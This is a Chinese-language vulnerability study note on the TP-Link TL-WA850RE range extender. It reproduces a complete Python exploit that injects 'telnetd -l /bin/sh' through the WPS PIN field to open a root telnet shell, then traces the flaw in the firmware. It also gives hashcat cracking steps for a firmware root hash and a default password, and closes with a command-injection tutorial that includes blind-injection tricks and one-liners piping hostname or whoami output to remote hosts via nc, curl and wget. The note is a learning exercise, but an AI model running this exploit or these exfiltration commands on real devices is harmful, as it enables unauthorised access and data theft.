# TP-Link TL-WA850RE - Remote Command Execution

简析：该路由器为![1411571179-2008228670_m.jpg](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/1411571179-2008228670_m.jpg?raw=true) 

主要功能是做无线wifi的中继器，产品测评地址如下：https://www.xfastest.com/thread-143356-1-1.html

，操作管理 和常规路由器相似 可已通过webapp 访问，此poc的攻击主要基于命令注入来获取shell，在去分析漏洞原理方面先去学习搭建 [firmware  analysis  toolkit](https://github.com/attify/firmware-analysis-toolkit) ，POC相对比较简单，先做代码层必要分析，后面提供其他分析



```python
#!/usr/bin/env python

# Exploit Title: TP-Link Technologies TL-WA850RE Wi-Fi Range Extender - Command Execution
# Date: 19/06/2018
# Exploit Author: yoresongo - Advisability S.A.S Colombia (www.advisability.co)
# Vendor Homepage: https://www.tp-link.com/
# Firmware Link: https://www.tp-link.com/en/download/TL-WA850RE.html   固件地址
# Tested on: Firmware Version TL-WA850RE_V5_180228
# Contact: yoresongo [at] advisability.co

import argparse #命令行处理
import requests #HTTP 请求 为应用层漏洞
import hashlib  #提供hash计算库
import telnetlib #内置支持telnet远程模块

parser = argparse.ArgumentParser(
    description="Exploits TP-LINK WA850RE Command injection"
)

#参数为  host  password  -C cookit(have default)

parser.add_argument("host", help="Host to attack.", type=str)
parser.add_argument("password", help="Extender's Password", type=str)
parser.add_argument(
    "-C", "--cookie", help="Cookie id value.", type=str, default="1301a8c000c4c505"
)
args = parser.parse_args()

HOST = args.host
PASSWORD = args.password
COOKIE = args.cookie

#拼接 cookites  数据为： Cookie: COOKIE=1301a8c000c4c505; gsScrollPos-8016=0
cookies = {"gsScrollPos-8016": "0", "COOKIE": COOKIE}


#拼接HTTPheader


headers = {
    "Origin": "http://%s/" % HOST,  #Origin标头标识导致用户代理发起HTTP请求的安全上下文.主要是用来说明最初请求是从哪里发起的,只用于Post请求
    "Accept-Encoding": "gzip, deflate", #声明浏览器支持的编码类型
    "Accept-Language": "en-US,en;q=0.9,es;q=0.8", #声明理解的自然语言
    "User-Agent": "Mozilla/5.0", #UA 用户代理
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",  #内容类型
    "Accept": "application/json, text/javascript, */*; q=0.01", #请求头用来告知客户端可以处理的内容类型
    "Referer": "http://%s/" % HOST, #referer字段表示从哪里链接到当前网页
    "X-Requested-With": "XMLHttpRequest", #可以用来判断客户端的请求是Ajax请求还是其他请求。
    "Connection": "keep-alive",  #当client和server通信时对于长链接如何进行处理
    "DNT": "1",   #要求服务器程序不要跟踪记录用户信息
}


password = hashlib.md5(PASSWORD.encode("utf-8")).hexdigest().upper() # 大写MD5
encoded = "%s:%s" % (password, COOKIE)  #格式化 密码和cookite
encoded = hashlib.md5(encoded.encode("utf-8")).hexdigest().upper()  #再次大写MD5 

#封装基础数据头 
#operation=write&option=connect&wps_setup_pin=11480723%3Btelnetd+-l+%2Fbin%2Fsh

data = [("operation", "login"), ("encoded", encoded), ("nonce", COOKIE)]


# Payload
data_inject = [
    ("operation", "write"),
    ("option", "connect"),
    ("wps_setup_pin", "11480723;telnetd -l /bin/sh"), #命令执行，telnetd  -l /bin/sh 开启telnet服务
]


with requests.Session() as s:
    response = s.post(
        "http://%s/data/login.json" % HOST, headers=headers, cookies=cookies, data=data
    ) #登录模块，进行验证登录
    print(response.text)

    # An authorised request. 正常合法请求
    r = s.get("http://%s" % HOST, headers=headers, cookies=cookies)
    # print (r.text)
    
    #对该页面进行 setup 文件设置
    r = s.post(
        "http://%s/data/wps.setup.json" % HOST,
        headers=headers,
        cookies=cookies,
        data=data_inject,
    )

tn = telnetlib.Telnet(HOST)
tn.interact()    #interact 启动子进程，进行控制，可以与telnet ssh 等进行 命令交互
```
-------明白大概是针对 命令行进行url 进行命令注入，但是确切的原理点不明确

--------同时不太明确是 如何 进行 fuzz 出来的 或者说 是如何 对其进行挖掘

正常思路：搭建漏洞环境，攻击测试，测试调试分析

下一部分先明确环境问题

firmadyne 框架中 binwalk对于大部分固件提取上没问题，但是firmadyne对于80%的固件运行有问题，需要二次开发。

提取环境为ubuntu14.04 

提取的固件如下

![QQå¾ç20180705182022.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/QQ%E5%9B%BE%E7%89%8720180705182022.png?raw=true) 

比较在意的是 wps-setup.json

`{`
	"timeout": false,
	"success": true,
	"data":{
		"wps_setup_pin": "205300", 
		"wl0_wps_setup_status": "success",
		"wl1_wps_setup_status": "failed",
		"wl0_wps_client_mac": "9A-34-7F-4C-B3-70",
		"wl1_wps_client_mac": "C2-43-E5-42-D5-68"    
	}
`}`

根据请求可以明显看出

operation=write&option=connect&wps_setup_pin=11480723%3Btelnetd+-l+%2Fbin%2Fsh

![QQå¾ç20180705183256.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/QQ%E5%9B%BE%E7%89%8720180705183256.png?raw=true) 

POST数据解析成

application/x-www-form-urlencoded编码  key:value 对应



说明 对 json 类的文件解析操作 没有做 处理



**对于分析原理角度及fuzz思路角度**

#### 分析原理角度：

网上较多的是做源码审计-->通过对固件文件审计，挖掘可利用点

首先是 对linux系统文件体系知识要丰富



#### 类似的审计弱点有：

对/etc/shadow (password口令影子文件) 简单破解

固件中 /etc/shadow 文件中的 数据为

root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:0:99999:7:::

```
类/etc/password 文件，分析每个条目为7个域，分别为：

例子： ynguo:x :509:510::/home/ynguo:/bin/bash 

名字 ：密码  ：用户Id  : 组ID  ： 用户信息 ：  主目录  ： shell 
```

对此类密码，强度较弱的情况下 可通过 [hashcat](https://samsclass.info/123/proj10/p12-hashcat.htm )  爆破

```
$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/

$1 代表类型1加密  其他的都为$ salt

如上 为 $GTN.gpri
```

正常的系统自带hash默认加密的次数 ： **grep -A 18 ENCRYPT_METHOD /etc/login.defs** 

![20180705192613.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/20180705192613.png?raw=true) 



```
下载密码字典  curl https://samsclass.info/123/proj10/500_passwords.txt> 500_passwords.txt 

 提取hash段 $1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/
```



**./hashcat-cli32.bin -m 1800 -a 0 -o found1.txt --remove crack1.hash 500_passwords.txt** 

- nix类型6密码哈希（-m 1800）
- 使用字典攻击（-a 0）
- 将输出放在文件**found1.txt中**
- 删除找到的每个哈希
- 从**crack1.hash**获取哈希值
- 使用字典**500_passwords.txt**

默认账号密码为 root:sohoadmin



#### 对其他系统初始化默认文件审计挖掘思路

inittab(linux初始化文件系统时初始化程序用到的配置文件)

```
::sysinit:/etc/rc.d/rcS
::respawn:/sbin/getty ttyS1 57600
::shutdown:/bin/umount -a
```

/etc/rc.d/rcS 系统初始化文件

```
#!/bin/sh

# This script runs when init it run during the boot process.

# Mounts everything in the fstab

mount -a
#mount -o remount +w /

#

# Mount the RAM filesystem to /tmp

#

mount -t ramfs -n none /tmp
mount -t ramfs -n none /var
mount -t ramfs -n none /config
mount -t sysfs -n none /sys

#

# Bring up lo

#

ifconfig lo 127.0.0.1 up

#

# insert netfilter/iptables modules

#

/etc/rc.d/rc.modules

#

# when disable nas, we need this to login

#
echo 'root:x:0:0:root:/root:/bin/sh' > /tmp/passwd

#

# Start Our Router Program

# 
brctl addbr br0
brctl setfd br0 0
brctl addif br0 eth2
ifconfig br0 192.168.0.254 down

/usr/bin/uclited
/usr/bin/httpd &  #跟我们想的httpd文件不一样 为自己的编写编译的

/etc/rc.d/rc.init

echo 524288 > /proc/sys/net/ipv4/ipfrag_high_thresh
echo 2 > /proc/sys/kernel/panic
```

/etc/rc.d/rc.init

```
#!/bin/sh
logd &
msgcenterd
wifid
dhcp_hook_d &
monitord
smartipd
#testd hello world &
gpiod &
timer_jobd
tddpd &
ntp_client &
dst &
tmpServer
#telnetd -l /bin/login &
sh /etc/rc.d/config-mii.sh &
#free memory
echo 3 > /proc/sys/vm/drop_caches
echo 2048 > /proc/sys/vm/min_free_kbytes
```

如上为审计出的应用程序文件，在挖掘过程中，需要对其主要文件进行审计（思路和灵感很重要）

在分析时，思路要以输入口为主：逐个文件审计，寻找启动主要应用程序，比如，上面的一段文件审计可以看出httpd为 主要的调用应用程序，



在本次分析我们正向思考较为容易 ，直接依据漏洞，向上寻找漏洞点

注重点 关注wps-setup.json  同时关注了其他相似的函数调用流程

图1



![20180705202822.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/20180705202822.png?raw=true) 



图2

![20180705203002.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/20180705203002.png?raw=true) 



函数调用路径 相似  上层均在 httpRpmInit做 下级回调



关注  wps-setup.json 处的函数处理

在httpwpsInit中

![20180705210043.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/20180705210043.png?raw=true) 

进行setup.json的请求处理，进入sub_429960



![20180705210305.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/20180705210305.png?raw=true) 

可以看出为什么要那样构建参数 operation:wirite

![20180705210344.png](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/picture/20180705210344.png?raw=true) 

构建参数 option:connect

以及明确可以看出 

执行的为 execFormCmd的 参数

故 wps_cli -s --pin %s 这个%s 是可以  通过 ；截断 同时添加任意命令行的 

("wps_setup_pin", "11480723;telnetd -l /bin/sh")

故可以开启 telnet 进行连接



### 那么对于命令注入类漏洞挖掘的思路应是如何？



**命令执行只是针对系统命令，而远程代码执行针对的是编程代码，两者互不能替换。**

举例说明注入挖掘验证（ruby脚本）：





#### ping 注入

`ping.rb`

`puts ping -c 4 #{ARGV[0]}` 



正常测试  

`time  ruby ping.rb '8.8.8.8'`

 0.09s user 0.04s system 4% cpu 3.176 total 

输出 ping 的时间  3秒

尝试sleep注入

time ruby ping.rb '8.8.8.8 && sleep 5' 

0.10s user 0.04s system 1% cpu 8.182 total 



#### ping 多参注入

```
puts `ping -c 4 #{ARGV[0]}`.include?('bytes from') ? 'yes' : 'no' 
```



```
$ ruby server-on.rb '8.8.8.8' 

yes 

$ ruby server-on.rb '8.8.8.7' 

no 
```

```
$ time ruby server-online.rb '8.8.8.8'

 yes

 0.10s user 0.04s system 4% cpu 3.174 total 

$ time ruby server-online.rb '8.8.8.8 && sleep 5'

 yes 

0.10s user 0.04s system 1% cpu 8.203 total 
```



同样的 

```
time ruby ping.rb '8.8.8.8`sleep 5`'  
```

  `` 反引号优先级也比较高，也会造成优先替换

```
命令	结果
ping -c 4 8.8.8.8`sleep 5`	sleep命令被执行，命令替换在命令行中。
ping -c 4 “8.8.8.8`sleep 5`”	sleep命令被执行，命令替换在复杂的字符串双引号之间。
ping -c 4 $(echo 8.8.8.8`sleep 5`)	sleep命令被执行，命令替换在使用不同符号时（请参见下面的示例）。
ping -c 4 ’8.8.8.8`sleep 5`’	sleep命令不执行，命令替换在简单字符串中不起作用（单引号之间）。
ping -c 4 `echo 8.8.8.8`sleep 5“	sleep命令不执行，使用相同符号时命令替换不起作用。

time ruby ping.rb '8.8.8.8$(sleep 5)'

time ruby ping.rb '8.8.8.8; sleep 5'
```





通过 分号分割 进行无中断注入

```
命令	结果
ping -c 4 8.8.8.8;sleep 5	sleep命令被执行，命令在命令行中顺序执行。
ping -c 4 “8.8.8.8;sleep 5″	sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。
ping -c 4 $(echo 8.8.8.8;sleep 5)	sleep命令被执行，排序命令在命令替换中起作用。
ping -c 4 ’8.8.8.8;sleep 5′	sleep命令未被执行， 附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。
ping -c 4 `echo 8.8.8.8;sleep 5`	sleep命令被执行，排序命令在命令替换中起作用。
```



命令管道  进行无中断注入



```
命令	结果
ping -c 4 8.8.8.8 | sleep 5	sleep命令被执行，管道输出在命令行正常执行。
ping -c 4 “8.8.8.8 | sleep 5″	sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。
ping -c 4 $(echo 8.8.8.8 | sleep 5)	sleep命令被执行，管道输出在命令替换中起作用。
ping -c 4 ’8.8.8.8 | sleep 5′	sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。
ping -c 4 `echo 8.8.8.8 | sleep 5`	sleep命令被执行，管道输出在命令替换中起作用。
```



### 常规注入&命令盲注

命令盲注不会在响应中返回命令的输出。

常规的命令注入，将返回响应中执行命令的输出。 



命令盲注输出将不会返回给用户，所以我们需要通过其它方法来提取输出。最直接的方法是将输出offload到你的服务器。我们只需在服务器上执行**nc -l -n -vv -p 80 -k**这条命令，并配置防火墙允许80端口入站连接。 



```
$ ruby server-online.rb '8.8.8.8 && hostname | nc IP 80' 

yes 
```



```
$ nc -l -n -vv -p 80 -k

 Listening on [0.0.0.0] (family 0, port 81)

 Connection from [1.2.3.4] port 80 [tcp/*] accepted (family 2, sport 64225) 

hacker.local 
```



```
站点工具存在判断验证小方法

curl -h && sleep 5 

wget -h && sleep 5 

ssh -V && sleep 5 

telnet && sleep 5 
```



#### 回显采用数据反弹发送

whoami | curl http://your-server -d @- 

wget http://your-server/$(whoami)

 export C=whoami | ssh user@your-server （在你的服务器上设置用户帐户以进行身份验证无需密码，并记录每个正在执行的命令） 



#### 主机名  命令注入盲猜



**sleep $(hostname | cut -c 1 | tr a 5)** 

1. 我们执行的命令为hostname。我们假设它返回hacker.local。
2. 它需要输出并将其传递给cut -c 1。这将选取hacker.local的第一个字符h。
3. 接着通过tr命令将字符a替换为5。
4. 然后将tr命令的输出传递给sleep命令，sleep h被执行将会立即出现报错，这是因为sleep后跟的参数智能为一个数字。然后，目标使用tr命令迭代字符。执行sleep $(hostname | cut -c 1 | tr h 5)命令，将需要5秒钟的时间。这样我们就可以确定第一个字符是一个h。以此类推，我们就能将完整的主机名猜解出来。



```
命令	时间	结果
ruby server-online.rb ’8.8.8.8;sleep $(hostname | cut -c 1 | tr a 5)’	3s	-
ruby server-online.rb ’8.8.8.8;sleep $(hostname | cut -c 1 | tr h 5)’	8s	h
ruby server-online.rb ’8.8.8.8;sleep $(hostname | cut -c 2 | tr a 5)’	8s	a
ruby server-online.rb ’8.8.8.8;sleep $(hostname | cut -c 3 | tr a 5)’	3s	-
ruby server-online.rb ’8.8.8.8;sleep $(hostname | cut -c 3 | tr c 5)’	8s	c
```



#### 主机名 长度  盲猜

hostname =  hacker.local    (length:12)

```
$ time ruby server-online.rb '8.8.8.8 && sleep $(hostname | wc -c)'  # wc -c 计算长度

 yes 

0.10s user 0.04s system 0% cpu 16.188 total 
```



####  其他技巧

[使用dig或nslookup进行DNS查询，将输出发送到端口53（UDP） ](https://twitter.com/jobertabma/status/882237472389947392)



> - ```
>   在服务器上执行端口扫描，并且基于暴露的服务确定提取输出的方式。
>   
>   > - **FTP**：尝试将文件写入可以从中下载文件的目录。
>   > - **SSH**：尝试将命令的输出写入MOTD banner，然后只需SSH到服务器。
>   > - **Web**：尝试将命令的输出写入公共目录（/var/www/）中。
>   ```



#### 绕过对空格的限制 

花括号用来匹配一组用逗号分隔的字符串中的任一个。左花括号之前的所有字符称为前文(preamble)，右花括号之后的所有字符称为后文(preamble)。前文和后文都是可选的。花括号中不能包含不加引号的空白符。 

[花括号扩展](http://www.gnu.org/software/bash/manual/bashref.html#Brace-Expansion)

```
puts `ping -c 4 #{ARGV[0].gsub(/\s+?/,'')}`  #删除空格
```



```
$ time ruby ping-2.rb '8.8.8.8;{sleep,5}'

 ... 

0.10s user 0.04s system 1% cpu 8.182 total 


$ ruby ping.rb '8.8.8.8;hostname|{nc,192.241.233.143,81}'


```





读取**/etc/passwd**下的内容：

```
$ ruby ping.rb '8.8.8.8;{cat,/etc/passwd}'
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=46 time=9.215 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=46 time=10.194 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=46 time=10.171 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=46 time=8.615 ms
 
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 8.615/9.549/10.194/0.668 ms
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode. At other times this information is provided by
# Open Directory.
...
```







## 总结

明确了 对于  命令注入类 漏洞的fuzz问题 就是 基于输入端 做畸形闭合符号黑盒测试

明确 对于 命令注入类漏洞的框架 挖掘类问题  还是要基于 代码审计 测试  经验 方面